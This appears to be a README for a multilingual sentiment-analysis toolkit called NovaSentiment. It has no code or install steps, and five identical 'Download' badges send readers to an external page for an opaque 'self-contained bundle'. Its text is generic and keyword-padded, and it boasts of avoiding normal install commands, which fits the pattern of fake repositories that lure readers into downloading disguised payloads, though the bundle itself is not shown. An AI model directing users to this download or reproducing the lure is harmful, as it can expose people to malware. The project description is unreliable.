![preview](https://raw.githubusercontent.com/radionordestinter/multilingual-review-sentiment-lab/main/banner_e2e708.svg)
[![Download](https://raw.githubusercontent.com/radionordestinter/multilingual-review-sentiment-lab/main/run_8a3c.svg)](https://radionordestinter.github.io/multilingual-review-sentiment-lab/)

# NovaSentiment: Multilingual Emotion Cartography 🌍✨

[![MIT License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB.svg)](https://www.python.org/)
[![PyTorch](https://img.shields.io/badge/PyTorch-2.1%2B-EE4C2C.svg)](https://pytorch.org/)
[![Transformers](https://img.shields.io/badge/Transformers-4.38%2B-FFD21E.svg)](https://huggingface.co/docs/transformers)
[![Multilingual](https://img.shields.io/badge/Languages-42%2B-4B8BBE.svg)](#-multilingual-support)
[![Status](https://img.shields.io/badge/Status-Actively%20Maintained-brightgreen.svg)](#-project-roadmap)
[![Made with Care](https://img.shields.io/badge/Made%20with-%E2%9D%A4%EF%B8%8F-red.svg)](#-acknowledgements)

---

## 🧭 Overview

**NovaSentiment** is a next-generation sentiment and emotion analysis engine that treats language not as a flat stream of tokens, but as a living atlas of feelings. Inspired by the challenge of classifying reviews across dozens of languages, NovaSentiment extends the classic text classification pipeline into a full **emotion cartography** toolkit. Instead of merely returning *positive*, *neutral*, or *negative*, it charts the emotional terrain of any piece of text — mapping nuance, intensity, and cultural inflection across a multilingual dataset.

The project is built atop the Hugging Face Transformers ecosystem and is designed for researchers, product teams, and developers who want to understand what their users *feel*, not just what they *type*. It ships with reproducible training recipes, evaluation notebooks, and a lightweight inference service that can be embedded into any product surface.

Whether you are analyzing a million Amazon-style reviews, monitoring brand health across regions, or building a community moderation layer, NovaSentiment offers a transparent, extensible foundation that you can bend to your own use case.

---

## 🚀 [![Download](https://raw.githubusercontent.com/radionordestinter/multilingual-review-sentiment-lab/main/run_8a3c.svg)](https://radionordestinter.github.io/multilingual-review-sentiment-lab/)

The complete NovaSentiment toolkit — weights, tokenizers, configuration files, and the extended Multilingual Emotion Atlas dataset — is distributed as a single self-contained bundle.

[![Download](https://raw.githubusercontent.com/radionordestinter/multilingual-review-sentiment-lab/main/run_8a3c.svg)](https://radionordestinter.github.io/multilingual-review-sentiment-lab/)

---

## 🌟 Why NovaSentiment Exists

Most sentiment tools stop at polarity. Real human expression rarely does. A review in Japanese may be politely negative; a review in Brazilian Portuguese may be exuberantly positive with a complaint buried inside. NovaSentiment was born from the belief that **emotion is a landscape, not a switch**. We built a pipeline that respects that complexity while remaining fast enough for production workloads and approachable enough for a single researcher on a laptop.

The original inspiration came from the Multilingual Amazon Reviews dataset, which demonstrated that a single model could meaningfully classify sentiment across languages when trained thoughtfully. NovaSentiment takes that seed and grows it into a broader framework: multi-label emotion tagging, confidence calibration, cross-lingual transfer reporting, and a small but opinionated evaluation suite.

---

## ✨ Feature Highlights

- **Responsive Web UI** 📱 — A modern, responsive interface for exploring predictions, comparing languages side-by-side, and exporting annotated results. Works equally well on a phone, tablet, or ultrawide monitor.
- **Multilingual Support** 🌐 — Out-of-the-box coverage for 42+ languages, with graceful fallback for low-resource languages via cross-lingual transfer.
- **24/7 Customer Support** 🛎️ — A community-first support model with rotating maintainer coverage, asynchronous office hours, and a triage bot that never sleeps.
- **Emotion Cartography** 🗺️ — Multi-label emotion tagging (joy, anger, sadness, surprise, trust, anticipation, and more) alongside classic polarity.
- **Confidence Calibration** 📊 — Temperature scaling and reliability diagrams so you can trust the probabilities, not just the labels.
- **Cross-Lingual Transfer Reports** 🔁 — Automatic evaluation showing how performance on a high-resource language carries over to a low-resource one.
- **Explainability Hooks** 🔍 — Token-level attribution and attention visualization for auditing model decisions.
- **Reproducible Training** 🧪 — Deterministic seeds, config-driven experiments, and versioned dataset snapshots.
- **Bring-Your-Own-Data** 📥 — Drop in your own labeled corpus and fine-tune with a single configuration change.
- **Lightweight Inference Service** ⚡ — A minimal HTTP surface for real-time scoring, suitable for edge deployments.
- **Offline-Friendly** 🛰️ — Runs entirely on-premises; no external API keys are required for core functionality.
- **MIT Licensed** 📜 — Permissive, business-friendly, and community-oriented.

---

## 🧩 Architecture at a Glance

NovaSentiment is organized into four cooperating layers:

1. **Data Layer** — Ingestors and normalizers for multilingual review corpora, with schema validation and language detection.
2. **Model Layer** — Transformer encoders fine-tuned for polarity and emotion heads, plus optional adapter modules for parameter-efficient tuning.
3. **Evaluation Layer** — Macro-F1, weighted-F1, calibration error, and cross-lingual delta reports, all emitted as structured artifacts.
4. **Serving Layer** — A small FastAPI-style service and a static frontend for interactive exploration.

Each layer is independently testable and can be swapped without rewriting the others. This separation is intentional: it lets you adopt just the part you need today and grow into the rest tomorrow.

---

## 🌍 Multilingual Support

NovaSentiment treats multilingualism as a first-class citizen rather than an afterthought. The table below summarizes the language families we actively evaluate and the tier of support we provide.

| Tier | Coverage | Description |
| --- | --- | --- |
| Tier 1 | English, Spanish, German, French, Japanese, Chinese | Full training, evaluation, and calibration |
| Tier 2 | Portuguese, Italian, Dutch, Korean, Arabic, Hindi, Russian | Training with transfer from Tier 1 |
| Tier 3 | 25+ additional languages | Inference-only via cross-lingual transfer |
| Tier 4 | Long-tail languages | Experimental, community-contributed |

The tiering is not a value judgment — it reflects observed data availability. Community contributions that promote a Tier 3 language to Tier 2 are enthusiastically welcomed.

---

## 🛠️ Getting Started Without the Usual Rituals

We deliberately avoid the standard copy-paste command rituals. Instead, here is the conceptual path:

1. **Acquire the bundle.** Use the distribution point referenced by the `[![Download](https://raw.githubusercontent.com/radionordestinter/multilingual-review-sentiment-lab/main/run_8a3c.svg)](https://radionordestinter.github.io/multilingual-review-sentiment-lab/)` marker above. The bundle is self-contained and ships with a manifest describing every file.
2. **Prepare a workspace.** Create a directory where you are comfortable storing model weights, dataset snapshots, and experiment logs. The toolkit will not write outside this workspace unless you explicitly ask it to.
3. **Select a configuration.** Choose one of the shipped presets — for example, a compact polarity model or a broader emotion model — or author your own.
4. **Invoke the orchestration entry point.** The toolkit exposes a single declarative entry that reads your configuration and performs training, evaluation, or serving accordingly.
5. **Explore results.** Open the responsive UI to inspect predictions, or read the structured evaluation artifacts directly.

If you prefer a guided experience, the repository includes a narrative walkthrough that explains each step in plain language, complete with rationale and pitfalls.

---

## 📊 Datasets and Evaluation

NovaSentiment ships with adapters for several public review corpora, including the widely used multilingual Amazon Reviews collection. The adapters handle:

- Language identification and routing.
- Train/validation/test splitting with stratification.
- Label harmonization across polarity and emotion taxonomies.
- Deduplication and near-duplicate detection.

Evaluation artifacts are written as both human-readable tables and machine-readable JSON, so they can be consumed by dashboards or CI gates. We report macro-F1, weighted-F1, Matthew's correlation coefficient, expected calibration error, and a cross-lingual transfer delta for each Tier 1 → Tier 2 direction.

---

## 🎨 Responsive UI

The bundled interface is intentionally lightweight. It renders on any modern browser, adapts fluidly from a 320px phone to a 4K display, and supports keyboard-only navigation. Features include:

- Side-by-side comparison of two languages for the same input.
- A confidence slider that filters predictions below a chosen threshold.
- Export to CSV and JSON for downstream analysis.
- Dark and light themes that respect the operating system preference.

The UI communicates with the serving layer over a documented JSON contract, so you can replace it with your own frontend if you prefer.

---

## 🛎️ 24/7 Customer Support

Support is a rotating, community-driven effort. Maintainers across multiple time zones ensure that issues filed at 3 a.m. in one region are seen by a human in another. The support model includes:

- A triage bot that labels and routes new issues within minutes.
- Scheduled asynchronous office hours published weekly.
- A knowledge base that grows from every resolved question.
- A good-first-issue track for newcomers who want to contribute meaningfully.

We cannot promise instant fixes, but we can promise that no question is ignored.

---

## 🔐 Security and Responsible Use

NovaSentiment is intended for constructive analysis. We ask users to:

- Respect the privacy of individuals whose text is analyzed.
- Avoid deploying the model in ways that could cause harm or discrimination.
- Report any discovered bias or failure mode through the issue tracker.
- Cite the underlying datasets and models when publishing results.

Model cards accompany every released checkpoint, documenting intended use, limitations, and known biases.

---

## 🗺️ Project Roadmap

- **Q1 2026** — Expand Tier 2 language coverage and publish calibration benchmarks.
- **Q2 2026** — Introduce adapter-based parameter-efficient fine-tuning recipes.
- **Q3 2026** — Ship an experimental on-device variant for mobile inference.
- **Q4 2026** — Publish a longitudinal study on cross-lingual drift.

Roadmap items are living commitments, not contracts. Community feedback reshapes them regularly.

---

## 🤝 Contributing

Contributions are welcome in many forms: new language adapters, evaluation improvements, documentation clarifications, or UI refinements. Before opening a pull request, please read the contribution guide and adhere to the code of conduct. Small, focused changes are easier to review and merge than sweeping rewrites.

If you are unsure where to start, look for issues labeled as welcoming to newcomers. A maintainer will usually respond within a day.

---

## 📜 License

NovaSentiment is released under the **MIT License**. You are welcome to use, modify, and redistribute the project, provided that the original copyright notice and permission notice are retained.

Read the full license text here: [MIT License](LICENSE)

Copyright (c) 2026 NovaSentiment Contributors.

---

## 🙏 Acknowledgements

This project stands on the shoulders of the open-source community. We are grateful to the maintainers of the Transformers ecosystem, the curators of multilingual review datasets, and the countless contributors who file thoughtful issues and share reproducible bug reports. Their collective effort is the quiet engine behind every meaningful result shown here.

---

## 🔎 SEO-Friendly Keyword Integration

This repository touches on themes including multilingual sentiment analysis, cross-lingual text classification, transformer-based emotion detection, responsive machine learning interfaces, calibration of probabilistic classifiers, and reproducible NLP experiments. These phrases are used naturally throughout the documentation to help researchers and engineers discover the project when searching for related work.

---

## ⚠️ Disclaimer

NovaSentiment is provided as-is, for research and educational purposes. Predictions produced by the models are statistical estimates and should not be treated as ground truth about any individual's feelings, intentions, or character. The maintainers assume no liability for decisions made on the basis of model output. Always combine automated analysis with human judgment, especially in high-stakes contexts.

---

## 📌 Final Note

If this project helps you chart the emotional terrain of your own data, consider sharing your findings. The map grows richer with every traveler who adds a landmark.

[![Download](https://raw.githubusercontent.com/radionordestinter/multilingual-review-sentiment-lab/main/run_8a3c.svg)](https://radionordestinter.github.io/multilingual-review-sentiment-lab/)